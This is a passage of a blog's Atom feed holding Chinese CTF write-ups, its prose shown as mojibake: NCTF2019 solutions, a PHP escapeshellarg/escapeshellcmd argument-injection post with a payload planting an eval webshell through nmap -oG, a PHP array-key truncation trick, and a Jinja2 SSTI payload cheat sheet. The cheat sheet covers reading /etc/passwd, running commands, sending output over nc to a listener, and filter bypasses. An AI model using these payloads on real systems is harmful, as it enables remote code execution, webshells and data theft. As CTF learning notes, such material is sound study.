class="line">s0VmjplR5khmhpgxdhx0kzTc9DK0vfjud35HVv6+KTyY+c3O0eosaAUzq+ce&#x2F;xrD95zhEQCX</span><br><span class="line"></span><br><span class="line">BwMOtwDYXUKHW+RyIsDjxoDXiy6Jgc+HsJaHQuD2CV1eaMgDy+28m5th9wiWeOAxdiM21&#x2F;hL</span><br><span class="line">bD6wunhPWZzcL0E9m&#x2F;zFKFAv&#x2F;JLdI3J6sc&#x2F;Axbq9OHtdfi8W8OEBHxoK4I9C&#x2F;EhE9CgmZsUS</span><br><span class="line">aCwm+1xcAqIxYgn7f4pE8f8F2xt0uxKP4SAWxUAkjIRJcZhEQ0GmjISxaFQciyHxuDiRQLa2</span><br><span class="line"></span><br><span class="line">SCWEQYlWEglGPC4EsZjocwkhiCdFgG1LUThNE0+1UhJA0xgjhVC0GEBAp0QglRYDOi2jUtKn</span><br><span class="line">tmjJEp6ksE8hYItG13AqRUAyNAepjDyVkaazMrYE2bwCQPAUpIHHnLQUZGh8JUujuRQGJStD</span><br><span class="line"></span><br><span class="line">&#x2F;TEA9yKRYB6ARAIeIYKiJRBudyqFA2YFcsI1&#x2F;pIYUHnZVk4aLUhDGcyxJTNFUJ2HkFkEMhVP</span><br><span class="line">ouAoZQy1cl2r5mj160CtfQkUKgFQaUQaHQK0ehRiqJEpeECu5LPBV0nlXIaMvyKTC8DTHKVq</span><br></pre></td></tr></table></figure><h4 id="pip-install"><a href="#pip-install" class="headerlink" title="pip install"></a>pip install</h4><p>è¿è¡Œå‘½ä»¤pip install â€“user nctf-2019-installmeï¼Œåœ¨æ§åˆ¶å°è¾“å‡ºåŒ…å«å‹ç¼©åŒ…ä¸‹è½½é“¾æ¥ï¼Œä¸‹è½½è§£å‹å¾—åˆ°æºç ï¼Œåœ¨â€œsetup.pyâ€æ‰¾åˆ°base64åŠ å¯†çš„flagï¼Œè§£ç å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;c4reful_ab0u7_ev1l_pip_p4ckage&#125;</span><br></pre></td></tr></table></figure><p>å¸è½½åº“pip uninstall nctf-2019-installmeï¼ŒçœŸå®flagæ–‡ä»¶ä½ç½®åœ¨//TODO</p><h4 id="NCTF2019é—®å·è°ƒæŸ¥"><a href="#NCTF2019é—®å·è°ƒæŸ¥" class="headerlink" title="NCTF2019é—®å·è°ƒæŸ¥"></a>NCTF2019é—®å·è°ƒæŸ¥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;Thank_you_for_participating_NCTF2019!&#125;</span><br></pre></td></tr></table></figure><h4 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h4><p>wertyuioåˆ†åˆ«å¯¹åº”2-9ï¼Œå¯¹åº”æ‰‹æœºä¹é”®â€¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NCTF&#123;youaresosmartthatthisisjustapieceofcake&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>çœŸå°±å·®1åå‘—= =</p><p>å·²ç»æ˜¯ç¬¬ä¸‰æ¬¡å·®ä¸€ç‚¹äº†ï¼Œä¸»è¦è¿˜æ˜¯wtclï¼Œæœ‰ä¸€ä¸ªflask debug è¿˜å·®ä¸€ç‚¹ã€‚</p><p>å¦å¤–æ„Ÿè°¢<strong>T1M</strong>å¸ˆå‚…å’Œ<strong>ç«å±±</strong>å¸ˆå‚…å¸¦é£~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æ‰“æ‰“å°æ¯”èµ›ç»ƒç»ƒæ‰‹~&lt;/p&gt;
&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WE
      
    
    </summary>
    
    
    
      <category term="Write up" scheme="https://www.sketchplane.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>æ•°ç»„é”®æˆªæ–­ä¸å‚æ•°æ³¨å…¥</title>
    <link href="https://www.sketchplane.top/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"/>
    <id>https://www.sketchplane.top/2019/10/25/%E6%95%B0%E7%BB%84%E9%94%AE%E6%88%AA%E6%96%AD%E4%B8%8E%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/</id>
    <published>2019-10-25T04:34:15.000Z</published>
    <updated>2019-10-25T05:28:19.850Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åˆ’æ°´åˆ’ç´¯äº†ï¼Œå­¦ä¹ ä¸€å“ˆã€‚</p><h2 id="escapeshellarg-escapeshellcmd"><a href="#escapeshellarg-escapeshellcmd" class="headerlink" title="escapeshellarg + escapeshellcmd"></a>escapeshellarg + escapeshellcmd</h2><p><code>escapeshellarg</code>ä¸<code>escapeshellcmd</code>ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯phpè®¾ç½®æ¥è½¬ä¹‰éæ³•å­—ç¬¦çš„ï¼Œä¸è¿‡ç”±äºå®ƒä»¬ä¿©çš„è½¬ä¹‰è§„åˆ™æœ‰æ‰€ä¸åŒï¼Œ<strong>å½“å…ˆä½¿ç”¨<code>escapeshellarg</code>å†ä½¿ç”¨<code>escapeshellcmd</code>æ—¶å¯èƒ½å¯¼è‡´å‘½ä»¤å‚æ•°æ³¨å…¥</strong>ã€‚</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>escapeshellarg</code>ï¼šå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå¹¶åœ¨ä¸¤è¾¹å†åŠ ä¸Šå•å¼•å·</p><p><code>escapeshellcmd</code>ï¼šå¯¹å•å¼•å·è½¬ä¹‰ï¼Œä¸”ä¸è½¬ä¹‰æˆå¯¹å¼•å·</p><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p><img src="https://mochazz.github.io/img/PHP-Audit-Labs/Day5/5.png" alt=""></p><p>æœ€åæ‰§è¡Œçš„è¯­å¥å˜æˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl '127.0.0.1'\\'' -v -d a=1\'</span><br></pre></td></tr></table></figure><p>ç®€åŒ–ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 127.0.0.1\ -v -d a&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p><em>æˆåŠŸå®ç°å‚æ•°æ³¨å…¥</em>~</p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h3><p>è€ƒå¯Ÿç‚¹ï¼šnmap -oG å‚æ•°å†™<code>webshell</code>ï¼Œå‚æ•°æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=' &lt;?php @eval($_POST["sketch_pl4ne"])?&gt;  -oG shell.php '</span><br></pre></td></tr></table></figure><p><strong>PSï¼šå‚æ•°è®°å¾—ç”¨åŒå¼•å·</strong></p><h2 id="0-gt-0-0x100000000-gt-0"><a href="#0-gt-0-0x100000000-gt-0" class="headerlink" title="[0 =&gt; 0] === [0x100000000 =&gt; 0]"></a>[0 =&gt; 0] === [0x100000000 =&gt; 0]</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>å¶ç„¶åœ¨ç¾¤é‡Œçœ‹åˆ°çš„ä¸€é“é¢˜ï¼Œåˆšå¼€å§‹ä»¥ä¸ºæ²¡ä»€ä¹ˆéš¾åº¦ï¼Œå®é™…ä¸Šè¿˜æ˜¯æœ‰ç‚¹ä¸œè¥¿çš„ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$user = [<span class="string">'admin'</span>, <span class="string">'xxoo'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'user'</span>]))  <span class="keyword">die</span>(show_souce(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'user'</span>] === $user &amp;&amp; $_GET[<span class="string">'user'</span>][<span class="number">0</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'sketch_pl4ne_wants_a_girlfriend.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>è¿™ä¸ªå®é™…ä¸Šè€ƒçš„æ˜¯<strong>ç´¢å¼•æ•°ç»„çš„æ•´æ•°é”®æˆªæ–­</strong>ï¼š<a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump([<span class="number">0</span> =&gt; <span class="number">0</span>] === [<span class="number">0x100000000</span> =&gt; <span class="number">0</span>]); <span class="comment">// bool(true)</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯æ„é€ payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?user[<span class="number">4294967296</span>]=admin&amp;user[<span class="number">1</span>]=xxoo</span><br><span class="line"><span class="comment">//0x100000000 == 4294967296</span></span><br></pre></td></tr></table></figure><p><strong>PSï¼šè¿™ä¸ªæ¼æ´ä»…åœ¨64ä½phpä¸­æœ‰æ•ˆ</strong></p><h3 id="æ‹“å±•çŸ¥è¯†"><a href="#æ‹“å±•çŸ¥è¯†" class="headerlink" title="æ‹“å±•çŸ¥è¯†"></a>æ‹“å±•çŸ¥è¯†</h3><p>å¦‚ä½•åˆ¤æ–­è‡ªå·±çš„phpæ˜¯32ä½è¿˜æ˜¯64ä½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'if 64-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'32-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'PHP_INT_SIZE'</span> . PHP_INT_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a></p><p><a href="http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/" target="_blank" rel="noopener">http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/</a></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>éªšå§¿åŠ¿ï¼Œä¸€å¤©å­¦å››ä¸ªï¼Œå˜¿å˜¿ï¼</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;åˆ’æ°´åˆ’ç´¯äº†ï¼Œå­¦ä¹ ä¸€å“ˆã€‚&lt;/p&gt;
&lt;h2 id=&quot;escapeshellarg-escapeshellcmd&quot;&gt;&lt;a href=&quot;#escap
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢SSTI</title>
    <link href="https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/"/>
    <id>https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/</id>
    <published>2019-10-23T15:48:44.000Z</published>
    <updated>2020-05-04T08:00:10.586Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘éœ€è¦åŠ ç´§ä¿®ç‚¼ï¼Œå¬å–å¸ˆå‚…å»ºè®®ï¼Œåšæ–‡è¿˜æ˜¯å½“ä½œç¬”è®°æ¥çœ‹å¾…ï¼Œè‡ªå·±èƒ½çœ‹æ‡‚å³å¯ã€‚</p><p>å¦‚æœ‰é—®é¢˜æ¬¢è¿æŒ‡æ•™ : ) </p><p><code>QICQï¼š1609410364</code></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><table><thead><tr><th>åç§°</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>è¿™ä¸ªå±æ€§ä¸­å­˜æ”¾ç€ç±»çš„å±æ€§å’Œæ–¹æ³•å¯¹åº”çš„é”®å€¼å¯¹,å®æµ‹moduleä¹Ÿæœ‰è¿™ä¸ªå±æ€§</td></tr><tr><td><code>__class__</code></td><td>è¿”å›ä¸€ä¸ªå®ä¾‹å¯¹åº”çš„ç±»å‹</td></tr><tr><td><code>__base__</code></td><td>è¿”å›ä¸€ä¸ªç±»æ‰€ç»§æ‰¿çš„åŸºç±»</td></tr><tr><td><code>__subclasses__()</code></td><td>è¿”å›è¯¥ç±»çš„æ‰€æœ‰å­ç±»</td></tr><tr><td><code>__mro__</code></td><td>pythonæ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œåœ¨è§£æ<code>__init__</code>æ—¶ï¼Œå®šä¹‰è§£æé¡ºåºçš„æ˜¯å­ç±»çš„<code>__mro__</code>å±æ€§ï¼ˆå€¼æ˜¯ç±»çš„å…ƒç»„ï¼‰</td></tr><tr><td><code>__slots__</code></td><td>é™åˆ¶ç±»åŠ¨æ€æ·»åŠ å±æ€§</td></tr><tr><td><code>__getattribute__()</code></td><td>è·å–å±æ€§æˆ–æ–¹æ³•ï¼Œå¯¹æ¨¡å—å’Œç±»éƒ½æœ‰æ•ˆ</td></tr><tr><td><code>__getitem__()</code></td><td>ä»¥ç´¢å¼•å–å€¼æˆ–è€…é”®å–å€¼</td></tr><tr><td><code>__globals__</code></td><td>è¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´ä¸­çš„æ‰€æœ‰å˜é‡</td></tr></tbody></table><h2 id="SSTI-åˆ¤æ–­æµç¨‹"><a href="#SSTI-åˆ¤æ–­æµç¨‹" class="headerlink" title="SSTI åˆ¤æ–­æµç¨‹"></a>SSTI åˆ¤æ–­æµç¨‹</h2><p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt=""></p><h2 id="payload-under-python2"><a href="#payload-under-python2" class="headerlink" title="payload under python2"></a>payload under python2</h2><h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p>PSï¼šç”±äºpython3å·²ç»ç§»é™¤äº†fileç±»ï¼Œæ‰€ä»¥æ˜¯æ‰¾ä¸åˆ°fileç±»çš„ï¼Œå¯ä»¥è‡ªå·±å†™ä¸ªè„šæœ¬ç¡®è®¤ä¸€ä¸‹ã€‚</p><h3 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/home/adu1t/Desktop/test.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'sketch_pl4ne_wants_a_girlfriend'</span>)</span><br></pre></td></tr></table></figure><p>åªæ˜¯æ¢ä¸ªå‡½æ•°ï¼Œå°±ä¸å¤šè®²äº†ã€‚</p><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯ä»å¯¹è±¡å›æº¯åˆ°<code>object</code>ç±»ï¼Œç„¶åå†å‘ä¸‹æ‰¾<code>os</code>ç±»ï¼Œç›´æ¥fuzzè·å–å­˜åœ¨<code>os</code>æ¨¡å—çš„ç±»çš„ç´¢å¼•å³å¯ã€‚</p><p>é€šç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># popen().read()å›æ˜¾å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><p>å¯¹äºæ²¡æœ‰å›æ˜¾çš„å‡½æ•°å¯ä»¥ç”¨æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„æ€è·¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># systemè¿”å›intå‹å€¼ï¼Œä¸å›æ˜¾å‘½ä»¤</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami| nc 192.168.179.133 2333')"</span>)</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>æ€è·¯å·®ä¸å¤šï¼Œä¸è¿‡æ˜¯æ‰¾<code>builtins</code>ç±»ï¼Œåœ¨py2ä¸py3éƒ½å­˜åœ¨ï¼Œåªæ˜¯å¯åˆ©ç”¨çš„ç±»çš„ä½ç½®æœ‰å·®å¼‚ã€‚</p><h2 id="payload-under-python3"><a href="#payload-under-python3" class="headerlink" title="payload under python3"></a>payload under python3</h2><h3 id="å‘½ä»¤æ‰§è¡Œ-1"><a href="#å‘½ä»¤æ‰§è¡Œ-1" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>é€šç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><p>PSï¼šè¿™é‡Œæ€è·¯æ˜¯å¯»æ‰¾<code>builtins</code>ç±»ï¼Œé€šè¿‡å†…ç½®æ–¹æ³•èµ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œç”±äºpy2ä¸py3åœ¨è¿™ä¸ªç±»ä¸ŠåŒºåˆ«å¹¶ä¸å¤§ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•çš„ç†è®ºä¸Šæ˜¯é€šç”¨çš„ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦åœ¨ä¸åŒç¯å¢ƒfuzzå‡ºå­ç±»ä¸­å­˜åœ¨<code>builtins</code>è¿™ä¸ªæ¨¡å—çš„ç±»çš„å³å¯ã€‚</p><h2 id="Bypass-tricks"><a href="#Bypass-tricks" class="headerlink" title="Bypass tricks"></a>Bypass tricks</h2><p>åŸç†5åˆ†é’Ÿï¼ŒBypassä¸¤å°æ—¶ã€‚</p><h3 id="å­—ç¬¦æ‹¼æ¥"><a href="#å­—ç¬¦æ‹¼æ¥" class="headerlink" title="å­—ç¬¦æ‹¼æ¥"></a>å­—ç¬¦æ‹¼æ¥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc'</span>+<span class="string">'/passwd'</span>).read()</span><br></pre></td></tr></table></figure><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŸè¯­å¥</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br><span class="line"><span class="comment"># ç¼–ç å</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ZXZhbA=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">"X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp"</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure><p>åŒç†ä¹Ÿå¯ä»¥è¿›è¡Œå…¶ä»–ç§ç±»ç¼–ç ã€‚ä¸‹é¢æ˜¯ä¸€é“ä¾‹é¢˜ï¼š</p><p><strong>[GYCTF2020]FlaskApp</strong></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c2db084a-c531-4ecf-8f13-61b4973a1d7c.node3.buuoj.cn/decode"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">a = <span class="string">'&#123;&#123;"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["o"+"s"]["po"+"pen"]("ca"+"t /this_is_the_fl"+"ag.txt").read()&#125;&#125;'</span></span><br><span class="line"><span class="comment"># &#123;&#123;"".__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["cG9wZW4=".decode("base64")]("whoami").read()&#125;&#125;</span></span><br><span class="line"><span class="keyword">print</span> base64.b64encode(<span class="string">"os"</span>)</span><br><span class="line">text = base64.b64encode(a)</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line">data = &#123;<span class="string">'text'</span>: text, <span class="string">'submit'</span>:<span class="string">'æäº¤'</span>&#125;</span><br><span class="line">r = s.post(url, data).text.encode(<span class="string">"utf-8"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'no no no'</span> <span class="keyword">not</span> <span class="keyword">in</span> r:</span><br><span class="line">    <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure><h3 id="Bypass-ä¸­æ‹¬å·"><a href="#Bypass-ä¸­æ‹¬å·" class="headerlink" title="Bypass ä¸­æ‹¬å·"></a>Bypass ä¸­æ‹¬å·</h3><p>è¯»æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é€šç”¨ __builtins__</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">58</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight 